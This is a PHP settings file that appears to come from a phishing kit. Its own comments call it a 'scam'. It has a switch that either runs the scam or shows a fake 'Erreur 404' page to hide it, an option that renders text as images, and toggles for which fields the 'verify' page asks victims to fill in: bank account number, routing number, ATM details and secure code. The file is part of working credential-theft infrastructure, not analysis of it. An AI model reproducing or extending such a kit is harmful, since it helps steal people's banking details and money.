<?php
if (!isset($_SESSION)) {
  session_start();
}
$_SESSION['MessageOFF']="Erreur 404<br>";
//this is the best Option for this scam ,please Change anything
$start=true;
//true :start the scam
//false : show erreur 404
//__________________________________________________________________________________________________

$convertimage=true;
//true to coverting text to image


//=====> Scam Option for labels of verify Page <=====

$bkA=false;
//true : for show Bank Account Number label ,false :for hidden
//-------------------------------------------------------------------------------------
$bkR=false;
//true : for show Bank Routing Number label ,false :for hidden
//-------------------------------------------------------------------------------------
$atmO=false;
//true : for show ATM label ,false :for hidden
//-------------------------------------------------------------------------------------
$securcode=false;
//true : for show Secure Code label ,false :for hidden
//-------------------------------------------------------------------------------------
 
?>